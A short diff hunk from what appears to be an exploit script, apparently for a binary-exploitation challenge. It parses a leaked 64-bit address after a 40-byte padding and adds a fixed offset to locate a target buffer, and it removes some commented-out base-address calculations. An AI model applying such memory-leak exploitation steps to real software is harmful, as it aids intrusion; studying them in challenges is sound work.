@@ -55,10 +55,6 @@ print(u64(z.split(b'A'*40)[1][:-1].ljust(8,b'\x00')))
 addr = u64(z.split(b'A'*40)[1][:-1].ljust(8,b'\x00'))
 print(hex(addr))
 
-
-# rip_addr = int(hex(addr),16)-int("0x8a44",16) #base rip? (8a44 - 8000????)
-# print(hex(rip_addr))
-
 msg = addr + int("0xCA6FC",16) #msg addr
 # main = 0x7ffff7f2eae4
 # msg = int("0x7ffff7ff91e0",16)
